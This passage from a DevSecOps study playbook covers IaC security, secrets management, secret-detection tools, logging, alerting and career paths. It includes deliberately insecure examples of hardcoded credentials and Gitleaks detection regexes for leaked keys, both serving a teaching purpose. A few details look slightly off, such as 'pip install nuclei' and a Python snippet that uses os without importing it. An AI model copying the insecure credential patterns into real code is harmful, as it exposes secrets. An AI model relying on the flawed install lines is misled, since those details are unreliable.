  - level: Metadata
    resources:
    - group: ""
      resources: ["secrets"]
      
  # Log pod exec/attach at RequestResponse level
  - level: RequestResponse
    resources:
    - group: ""
      resources: ["pods/exec", "pods/attach"]
      
  # Log all other resources at Request level
  - level: Request
    resources:
    - group: ""
```

---

## 7. Infrastructure as Code (IaC) Security

### 7.1 IaC Overview

```
┌─────────────────────────────────────────────────────────────┐
│                Infrastructure as Code                        │
├─────────────────────────────────────────────────────────────┤
│                                                              │
│   Declarative                    Imperative                  │
│   ┌─────────────────┐           ┌─────────────────┐         │
│   │   Terraform     │           │    Ansible      │         │
│   │   Pulumi        │           │    Chef         │         │
│   │   CloudFormation│           │    Puppet       │         │
│   └─────────────────┘           └─────────────────┘         │
│                                                              │
│   "What" to create              "How" to create             │
│                                                              │
└─────────────────────────────────────────────────────────────┘
```

### 7.2 Terraform Security

#### Secure Terraform Configuration

```hcl
# ❌ INSECURE: Hardcoded credentials
provider "aws" {
  access_key = "AKIAIOSFODNN7EXAMPLE"
  secret_key = "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"
  region     = "us-west-2"
}

# ✅ SECURE: Environment variables or IAM roles
provider "aws" {
  region = var.aws_region
  # Uses AWS_ACCESS_KEY_ID, AWS_SECRET_ACCESS_KEY env vars
  # Or IAM role if running on EC2/ECS/Lambda
}

# ✅ SECURE: S3 bucket with encryption
resource "aws_s3_bucket" "secure_bucket" {
  bucket = "my-secure-bucket"
}

resource "aws_s3_bucket_server_side_encryption_configuration" "secure_bucket" {
  bucket = aws_s3_bucket.secure_bucket.id

  rule {
    apply_server_side_encryption_by_default {
      sse_algorithm     = "aws:kms"
      kms_master_key_id = aws_kms_key.bucket_key.arn
    }
  }
}

resource "aws_s3_bucket_public_access_block" "secure_bucket" {
  bucket = aws_s3_bucket.secure_bucket.id

  block_public_acls       = true
  block_public_policy     = true
  ignore_public_acls      = true
  restrict_public_buckets = true
}

resource "aws_s3_bucket_versioning" "secure_bucket" {
  bucket = aws_s3_bucket.secure_bucket.id
  versioning_configuration {
    status = "Enabled"
  }
}
```

#### Terraform State Security

```hcl
# Remote state with encryption
terraform {
  backend "s3" {
    bucket         = "terraform-state-bucket"
    key            = "prod/terraform.tfstate"
    region         = "us-west-2"
    encrypt        = true
    dynamodb_table = "terraform-locks"
    kms_key_id     = "alias/terraform-state-key"
  }
}
```

### 7.3 IaC Security Scanning

#### tfsec

```bash
# Install
brew install tfsec

# Scan
tfsec .

# With specific checks
tfsec . --minimum-severity HIGH

# Output formats
tfsec . --format json > results.json
tfsec . --format sarif > results.sarif
```

#### Checkov

```bash
# Install
pip install checkov

# Scan Terraform
checkov -d /path/to/terraform

# Scan Kubernetes
checkov -f deployment.yaml

# Scan Dockerfile
checkov --framework dockerfile -f Dockerfile

# Skip checks
checkov -d . --skip-check CKV_AWS_21,CKV_AWS_18
```

#### Example Checkov Output

```
Passed checks: 42
Failed checks: 3
Skipped checks: 1

Check: CKV_AWS_21: "Ensure all S3 bucket logging is enabled"
  FAILED for resource: aws_s3_bucket.data_bucket
  File: /main.tf:15-25

Check: CKV_AWS_18: "Ensure the S3 bucket has access logging enabled"
  FAILED for resource: aws_s3_bucket.data_bucket
  File: /main.tf:15-25
```

### 7.4 Ansible Security

#### Secure Ansible Playbook

```yaml
# ❌ INSECURE: Plain text password
- name: Create database user
  mysql_user:
    name: admin
    password: "SuperSecret123"
    
# ✅ SECURE: Using Ansible Vault
- name: Create database user
  mysql_user:
    name: admin
    password: "{{ db_password }}"
```

#### Ansible Vault

```bash
# Create encrypted file
ansible-vault create secrets.yml

# Edit encrypted file
ansible-vault edit secrets.yml

# Encrypt existing file
ansible-vault encrypt vars.yml

# Run with vault password
ansible-playbook site.yml --ask-vault-pass
ansible-playbook site.yml --vault-password-file=~/.vault_pass
```

```yaml
# secrets.yml (encrypted)
db_password: !vault |
  $ANSIBLE_VAULT;1.1;AES256
  623636623438...
api_key: !vault |
  $ANSIBLE_VAULT;1.1;AES256
  383463646438...
```

---

## 8. Secrets Management

### 8.1 Secrets Management Overview

```
┌─────────────────────────────────────────────────────────────┐
│              Secrets Management Architecture                 │
├─────────────────────────────────────────────────────────────┤
│                                                              │
│   ┌──────────────┐      ┌──────────────┐                    │
│   │  Application │ ←──→ │   Secrets    │                    │
│   │              │      │   Manager    │                    │
│   └──────────────┘      └──────────────┘                    │
│          ↑                     ↑                             │
│          │                     │                             │
│   ┌──────────────┐      ┌──────────────┐                    │
│   │   CI/CD      │      │    Audit     │                    │
│   │   Pipeline   │      │    Logs      │                    │
│   └──────────────┘      └──────────────┘                    │
│                                                              │
└─────────────────────────────────────────────────────────────┘
```

### 8.2 Common Secrets

| Secret Type | Examples | Risk if Exposed |
|-------------|----------|-----------------|
| **API Keys** | AWS keys, Stripe keys | Account compromise |
| **Database Credentials** | Connection strings | Data breach |
| **SSH Keys** | Private keys | Server access |
| **Certificates** | TLS/SSL certs | MITM attacks |
| **Tokens** | JWT, OAuth tokens | Account takeover |
| **Passwords** | Service accounts | Lateral movement |

### 8.3 Secret Detection Tools

#### Gitleaks

```bash
# Install
brew install gitleaks

# Scan repository
gitleaks detect --source . --verbose

# Scan git history
gitleaks detect --source . --log-opts="--all"

# Custom config
gitleaks detect --config=.gitleaks.toml
```

```toml
# .gitleaks.toml
title = "Custom Gitleaks Config"

[[rules]]
id = "aws-access-key"
description = "AWS Access Key"
regex = '''AKIA[0-9A-Z]{16}'''
tags = ["aws", "key"]

[[rules]]
id = "generic-api-key"
description = "Generic API Key"
regex = '''(?i)(api[_-]?key|apikey)['":\s]*[=:]\s*['"]?([a-z0-9]{32,})['"]?'''
tags = ["api", "key"]

[allowlist]
paths = [
  '''.*test.*''',
  '''.*mock.*'''
]
```

#### TruffleHog

```bash
# Scan git repo
trufflehog git file://. --only-verified

# Scan GitHub org
trufflehog github --org=myorg --only-verified

# Scan filesystem
trufflehog filesystem /path/to/scan
```

### 8.4 HashiCorp Vault

```bash
# Start Vault server
vault server -dev

# Authenticate
export VAULT_ADDR='http://127.0.0.1:8200'
vault login token=<root-token>

# Store secret
vault kv put secret/myapp/db \
    username=admin \
    password=s3cr3t

# Read secret
vault kv get secret/myapp/db

# Enable AppRole auth
vault auth enable approle
vault write auth/approle/role/myapp \
    secret_id_ttl=10m \
    token_ttl=20m \
    token_max_ttl=30m \
    policies="myapp-policy"
```

```python
# Python application using Vault
import hvac

client = hvac.Client(url='http://vault:8200')
client.auth.approle.login(
    role_id=os.environ['VAULT_ROLE_ID'],
    secret_id=os.environ['VAULT_SECRET_ID']
)

# Read secret
secret = client.secrets.kv.v2.read_secret_version(
    path='myapp/db',
    mount_point='secret'
)
db_password = secret['data']['data']['password']
```

### 8.5 AWS Secrets Manager

```python
import boto3
from botocore.exceptions import ClientError

def get_secret(secret_name, region_name="us-west-2"):
    session = boto3.session.Session()
    client = session.client(
        service_name='secretsmanager',
        region_name=region_name
    )
    
    try:
        response = client.get_secret_value(SecretId=secret_name)
        return response['SecretString']
    except ClientError as e:
        raise e
```

```yaml
# GitHub Actions with AWS Secrets Manager
- name: Get secrets from AWS Secrets Manager
  uses: aws-actions/aws-secretsmanager-get-secrets@v1
  with:
    secret-ids: |
      DB_PASSWORD,prod/db/password
      API_KEY,prod/api/key
```

---

## 9. Security Monitoring & Logging

### 9.1 Security Logging Best Practices

```
┌─────────────────────────────────────────────────────────────┐
│                What to Log (Security Events)                 │
├─────────────────────────────────────────────────────────────┤
│ ✓ Authentication events (success/failure)                   │
│ ✓ Authorization failures                                    │
│ ✓ Input validation failures                                 │
│ ✓ Session management events                                 │
│ ✓ Administrative actions                                    │
│ ✓ Access to sensitive data                                  │
│ ✓ Configuration changes                                     │
│ ✓ Security exceptions                                       │
├─────────────────────────────────────────────────────────────┤
│                What NOT to Log                               │
├─────────────────────────────────────────────────────────────┤
│ ✗ Passwords (even hashed)                                   │
│ ✗ Session tokens                                            │
│ ✗ Credit card numbers                                       │
│ ✗ Personal data (PII) without consent                       │
│ ✗ Full API keys                                             │
└─────────────────────────────────────────────────────────────┘
```

### 9.2 Structured Logging

```python
import logging
import json
from datetime import datetime

class SecurityLogger:
    def __init__(self, app_name):
        self.logger = logging.getLogger(app_name)
        self.app_name = app_name
        
    def log_event(self, event_type, user_id, details, severity="INFO"):
        log_entry = {
            "timestamp": datetime.utcnow().isoformat(),
            "app": self.app_name,
            "event_type": event_type,
            "user_id": user_id,
            "severity": severity,
            "details": details,
            "correlation_id": self._get_correlation_id()
        }
        self.logger.info(json.dumps(log_entry))
        
    def log_auth_failure(self, username, ip_address, reason):
        self.log_event(
            event_type="AUTH_FAILURE",
            user_id=username,
            details={
                "ip_address": ip_address,
                "reason": reason
            },
            severity="WARNING"
        )
```

### 9.3 Security Alerting

```yaml
# Prometheus alerting rules
groups:
- name: security-alerts
  rules:
  - alert: HighAuthenticationFailures
    expr: |
      sum(rate(auth_failures_total[5m])) by (service) > 10
    for: 5m
    labels:
      severity: critical
    annotations:
      summary: High authentication failure rate
      description: "{{ $labels.service }} has {{ $value }} auth failures/sec"
      
  - alert: SuspiciousAPIActivity
    expr: |
      sum(rate(api_requests_total{status="403"}[5m])) by (ip) > 100
    for: 2m
    labels:
      severity: warning
    annotations:
      summary: Suspicious API activity detected
      description: "IP {{ $labels.ip }} has high 403 rate"
```

---

## 10. DevSecOps Tools Reference

### 10.1 Complete Tool Matrix

| Category | Tool | Purpose | Integration |
|----------|------|---------|-------------|
| **SAST** | SonarQube | Code quality & security | CI/CD, IDE |
| **SAST** | Semgrep | Pattern-based scanning | CI/CD, pre-commit |
| **SAST** | Bandit | Python security | CI/CD |
| **DAST** | OWASP ZAP | Web app scanning | CI/CD |
| **DAST** | Nuclei | Template scanning | CI/CD |
| **SCA** | Snyk | Dependency scanning | CI/CD, IDE |
| **SCA** | OWASP Dependency-Check | CVE detection | CI/CD |
| **Container** | Trivy | Image scanning | CI/CD |
| **Container** | Grype | Vulnerability scanning | CI/CD |
| **IaC** | tfsec | Terraform scanning | CI/CD |
| **IaC** | Checkov | Multi-IaC scanning | CI/CD |
| **Secrets** | Gitleaks | Secret detection | Pre-commit, CI/CD |
| **Secrets** | TruffleHog | Secret hunting | CI/CD |
| **K8s** | Falco | Runtime security | Runtime |
| **K8s** | kube-bench | CIS benchmarks | Audit |
| **Secrets Mgmt** | HashiCorp Vault | Secrets storage | Runtime |

### 10.2 Tool Installation Cheat Sheet

```bash
# SAST Tools
pip install bandit semgrep
npm install -g eslint @typescript-eslint/parser

# DAST Tools
docker pull owasp/zap2docker-stable
pip install nuclei

# SCA Tools
npm install -g snyk
pip install pip-audit safety

# Container Security
brew install trivy grype
pip install dockerfile-lint

# IaC Security
brew install tfsec checkov
pip install ansible-lint

# Secret Detection
brew install gitleaks trufflehog

# Kubernetes Security
brew install kube-bench kubesec
```

---

## 11. Practical Labs & Challenges

### 11.1 TryHackMe DevSecOps Rooms

| Room | Topics | Difficulty |
|------|--------|------------|
| **Intro to DevSecOps** | Fundamentals, culture | Easy |
| **SDLC** | Development lifecycle | Easy |
| **SSDLC** | Secure SDLC practices | Easy |
| **Intro to Pipeline Automation** | CI/CD basics | Easy |
| **Source Code Security** | Git security, code review | Medium |
| **CI/CD and Build Security** | Jenkins, GitLab CI | Medium |
| **Dependency Management** | SCA, package security | Medium |
| **SAST** | Static analysis tools | Medium |
| **DAST** | Dynamic testing | Medium |
| **Intro to Containerisation** | Container basics | Easy |
| **Intro to Docker** | Docker fundamentals | Easy |
| **Container Vulnerabilities** | Docker security | Medium |
| **Container Hardening** | Securing containers | Medium |
| **Intro to Kubernetes** | K8s fundamentals | Medium |
| **K8s Runtime Security** | Falco, audit logs | Hard |

### 11.2 Hands-on Exercises

#### Exercise 1: Secure CI/CD Pipeline

```yaml
# Create a complete DevSecOps pipeline
# 1. Set up GitHub repository
# 2. Add pre-commit hooks (gitleaks)
# 3. Configure GitHub Actions
# 4. Add SAST (Semgrep)
# 5. Add SCA (Snyk)
# 6. Add container scanning (Trivy)
# 7. Add DAST (ZAP)
# 8. Configure security gates
```

#### Exercise 2: Container Hardening

```bash
# Harden a Docker container
# 1. Start with vulnerable Dockerfile
# 2. Scan with Trivy
# 3. Fix vulnerabilities
# 4. Add security context
# 5. Implement least privilege
# 6. Verify with container scan
```

#### Exercise 3: Kubernetes Security

```bash
# Secure a K8s deployment
# 1. Create namespace with PSA
# 2. Implement RBAC
# 3. Add Network Policies
# 4. Configure Pod Security
# 5. Deploy Falco
# 6. Enable audit logging
```

---

## 12. Career Path & Certifications

### 12.1 DevSecOps Career Progression

```
┌─────────────────────────────────────────────────────────────┐
│              DevSecOps Career Progression                    │
├─────────────────────────────────────────────────────────────┤
│                                                              │
│   Entry Level (0-2 years)                                   │
│   ├── Junior DevSecOps Engineer                             │
│   ├── Security Analyst                                      │
│   └── DevOps Engineer (security focus)                      │
│                                                              │
│   Mid Level (2-5 years)                                     │
│   ├── DevSecOps Engineer                                    │
│   ├── Application Security Engineer                         │
│   └── Cloud Security Engineer                               │
│                                                              │
│   Senior Level (5+ years)                                   │
│   ├── Senior DevSecOps Engineer                             │
│   ├── Security Architect                                    │
│   └── DevSecOps Lead                                        │
│                                                              │
│   Leadership (8+ years)                                     │
│   ├── DevSecOps Manager                                     │
│   ├── Head of Application Security                          │
│   └── CISO                                                  │
│                                                              │
└─────────────────────────────────────────────────────────────┘
```

### 12.2 Relevant Certifications

| Certification | Provider | Focus |
|---------------|----------|-------|
| **CDP** | Practical DevSecOps | DevSecOps pipelines |
| **CKS** | CNCF | Kubernetes security |
| **AWS Security Specialty** | AWS | Cloud security |
| **CCSK** | CSA | Cloud security knowledge |
| **OSCP** | Offensive Security | Penetration testing |
| **GIAC GWEB** | SANS | Web application security |
| **CEH** | EC-Council | Ethical hacking |
| **CompTIA Security+** | CompTIA | Security fundamentals |

### 12.3 Salary Expectations (2026)

| Level | Experience | Salary Range (USD) |
|-------|------------|-------------------|
| Junior | 0-2 years | $70K - $95K |
| Mid | 2-5 years | $95K - $140K |
| Senior | 5-8 years | $140K - $180K |
| Lead/Principal | 8+ years | $180K - $250K |
| Director/Manager | 10+ years | $200K - $300K |

---

## 📚 Quick Reference Card

### Essential Commands

```bash
# Secret Detection
gitleaks detect --source . --verbose

# SAST
semgrep --config=p/security-audit .
bandit -r src/

# SCA
snyk test
npm audit
pip-audit

# Container Scanning
trivy image myimage:latest
grype myimage:latest

# IaC Scanning
tfsec .
checkov -d .

# DAST
zap-cli quick-scan http://target.com

# Kubernetes
kubectl auth can-i --list
kube-bench run --targets node
```

### Security Headers Checklist

```
Content-Security-Policy: default-src 'self'
X-Content-Type-Options: nosniff
X-Frame-Options: DENY
X-XSS-Protection: 1; mode=block
Strict-Transport-Security: max-age=31536000; includeSubDomains
Referrer-Policy: strict-origin-when-cross-origin
Permissions-Policy: geolocation=(), microphone=()
```

---

## 🎯 Conclusion

This playbook provides a comprehensive guide to DevSecOps based on TryHackMe's learning path. Key takeaways:

1. **Shift Left** - Integrate security from the earliest stages
2. **Automate** - Security checks should be automated in CI/CD
3. **Continuous** - Security is not a one-time activity
4. **Collaborative** - Dev, Sec, and Ops must work together
5. **Measurable** - Track security metrics and improvements

Remember: **Security is everyone's responsibility!**

---

*Document created for study and professional reference.*
*PinkOffense Security | B1naryBun 🐰💜*
